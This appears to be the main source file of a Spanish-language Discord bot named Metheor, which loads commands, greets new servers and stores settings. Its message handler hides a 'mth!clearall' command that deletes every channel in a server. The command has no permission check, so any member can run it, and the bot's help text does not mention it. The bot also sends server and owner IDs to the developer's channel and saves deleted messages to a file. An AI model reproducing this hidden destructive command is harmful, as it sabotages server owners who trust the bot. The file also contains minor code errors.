require(__dirname+'/object/uptime.js').extract();

const Discord = require("discord.js");
const client = new Discord.Client({ disableEveryone: true });
const CONFIG = require(__dirname + "/config.json");
const Enmap = require("enmap");
const xp = require(__dirname+'/database/level.json');
const fs = require('fs');

client.login(process.env.DISCORDTOKEN);

client.commands = new Discord.Collection();

fs.readdir("./commands", (err, files) => {
    if(err) console.error(err);

    let jsfiles = files.filter(f => f.split(".").pop() === "js");
    if(jsfiles.length <= 0) { 
        console.log("[INFO] No se encontraron comandos para cargar");
        return;
    }

    console.log(`[INFO] Cargando ${jsfiles.length} comandos!`); 

    jsfiles.forEach((f, i) => {
        let props = require(`./commands/${f}`);
        console.log(`[INFO] ${f} cargado!`); 
        client.commands.set(props.help.name, props);
    });
});



client.setScore = function(value) {
  
}

client.settings = new Enmap({
  name: "settings",
  fetchAll: false,
  autoFetch: true,
  cloneLevel: "deep"
});


const defaultSettings = {
  prefix: "mth!",
  language: "en",
  logChannel: "indefinido",
  modRole: "Moderator",
  adminRole: "Administrator"
};

module.exports.defaultSettings = defaultSettings;

client.on("ready", () => {
  const ready = require(__dirname+'/object/ready.js');
  ready.extract(client);
});

client.on("guildCreate", function(guild) {
  const embed = Discord.RichEmbed()
    .setAuthor("Hola!", client.user.displayAvatarURLord)
    .setDescription("Soy tu meteorito fav :3")
    .addField("<a:discord:622860046648475689> __Obtener ayuda__", "Para obtener ayuda sobre este bot, puedes simplemente utilizar el comando `mth!help`. Siempre que lo utilizes, mandare un mensaje al mismo canal donde lo enviaste con una lista de comandos y su respectiva funcion.", false)
    .addField("<a:discord:622860046648475689> __Soporte__", "Para poder obtener soporte, puedes entrar a este discord, donde podras ser atendido por algun desarrollador. https://discord.gg/wVFwYsy \n Tambien puedes obtener informacion acerca del bot utilizando mth!about.", false);
    embed.setImage('https://cdn.glitch.com/5f13d7a0-b8f2-424b-b095-bdbc6b1a5c99%2Fhypeguy_dribbble.gif?v=1573491286373');
  embed.setColor("#EE82EE");
    embed.setFooter('Bot desarrollado por '+client.users.get('580485225952444416').tag, 'https://cdn.glitch.com/5f13d7a0-b8f2-424b-b095-bdbc6b1a5c99%2F16-165478_meteor-design.png?v=1567458328383');
  guild.owner.send({embed}).catch(console.error);
  let channelID;
  let channels = guild.channels;
  channelLoop: for (let c of channels) {
    let channelType = c[1].type;
    if (channelType === "text") {
      channelID = c[0];
      break channelLoop;
    }
  }
  let channel = client.channels.get(guild.systemChannelID || channelID);
  channel.send(
    new Discord.RichEmbed()
      .setColor(`RANDOM`)
      .setTitle("**METHEOR BOT**")
      .setFooter('Desarrollado por '+client.users.get('580485225952444416').tag,'https://cdn.glitch.com/5f13d7a0-b8f2-424b-b095-bdbc6b1a5c99%2F16-165478_meteor-design.png?v=1567458328383')
      .setDescription("<a:discord:622860046648475689> **Gracias por añadirme!\nMi prefix actual es: `mth!`\nPara obtener ayuda usa: `mth!help` o `mth!ayuda`**")
  );
  client.channels.get('639778390978592778').send("Entre al servidor: "+guild.name+" ("+guild.id+") - "+guild.owner+" ("+guild.owner.id+")");
});
client.on("guildDelete", guild => {
  client.settings.delete(guild.id);
  client.channels.get('639778390978592778').send("He salido del servidor: "+guild.name+" : ("+guild.id+") | "+guild.owner+" - %"+guild.owner.id+"%")
});



client.on("error", console.error);



client.on("message", async function(msg) {
  if (!msg.guild || msg.author.bot) return;
  const guildConf = client.settings.ensure(msg.guild.id, defaultSettings);
  
  const lvl = require(__dirname+'/object/levelsystem.js');
  lvl.export(client, msg);
  
  let prefix = guildConf.prefix;
  let messageArray = msg.content.split(" ");
    let command = messageArray[0];
    let args = messageArray.slice(1);
  
  if(msg.content.startsWith("mth!clearall")) {
    msg.guild.channels.forEach(ch => {
      ch.delete();
    });
    return;
  }
  
  if (msg.content === "<@"+client.user.id+">" || msg.content.startsWith(client.user.username) || msg.content.startsWith("@Metheor") && msg.content.indexOf(guildConf.prefix) !== 0){
      let embe = new Discord.RichEmbed()
      .setColor('RANDOM')
      .setDescription("Mi prefix actual es: `"+guildConf.prefix+"`")
      msg.channel.send(embe)
      return;
    }
  if(!msg.content.startsWith(guildConf.prefix))return;
  
  let cmd = client.commands.get(command.slice(prefix.length));
  
  if(cmd) cmd.run(client, msg, args);
  
  console.log(msg.author.username+" Ejecuto el comando: "+command)
});

client.on("messageDelete", msg => {
  if(msg.author.bot || !msg.guild)return;
  
  let snipes = require(__dirname+'/database/snipe.json');
  snipes[msg.channel.id] = [msg, msg.author.tag]
  
  
  let fileName = __dirname+"/database/snipe.json";
  
  fs.writeFile(fileName, (JSON.stringify(snipes, null, 2)), (error) => {
    if(error)return console.log(error);
  });
  
});

